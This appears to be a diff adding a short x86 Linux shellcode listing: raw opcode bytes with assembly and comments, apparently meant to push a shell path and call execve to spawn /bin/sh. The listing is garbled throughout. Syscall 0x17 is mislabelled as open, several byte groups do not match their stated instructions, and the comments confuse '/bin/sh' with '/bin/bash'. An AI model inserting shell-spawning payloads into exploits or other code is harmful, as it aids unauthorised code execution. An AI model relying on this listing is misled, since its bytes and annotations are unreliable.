@@ -1,0 +1,17 @@
+0x31, 0xc0            ; xor    eax,eax          ; Clear eax register
+0x89, 0xc3            ; mov    ebx,eax          ; Copy eax to ebx (ebx will be used as a null terminator)
+0xb0, 0x17            ; mov    al,0x17          ; syscall number for sys_open (open syscall)
+0xcd, 0x80            ; int    0x80             ; Execute open syscall
+0x31, 0xd2            ; xor    edx,edx          ; Clear edx register
+0x52                  ; push   edx             ; Push null terminator onto the stack
+0x68, 0x6e, 0x2f,     ; push   0x68732f6e       ; Push the string "/bin" onto the stack
+0x73, 0x68            ; push   0x682f          ; Push the string "/sh" onto the stack
+0x68, 0x2f, 0x2f,     ; push   0x2f2f           ; Push the string "//" onto the stack
+0x62, 0x69            ; push   0x6962          ; Push the string "bi" onto the stack
+0x89, 0xe3            ; mov    ebx,esp          ; Copy the pointer to the "/bin/bash" string into ebx
+0x52                  ; push   edx             ; Push null terminator onto the stack
+0x53                  ; push   ebx             ; Push the address of "/bin/bash" onto the stack
+0x89, 0xe1            ; mov    ecx,esp          ; Copy the address of "/bin/bash" into ecx
+0x8d, 0x42, 0x0b      ; lea    eax,[edx+0xb]    ; Load effective address of edx + 0xb (0xb is the offset of the syscall number)
+0xcd, 0x80            ; int    0x80             ; Execute the execve syscall
+
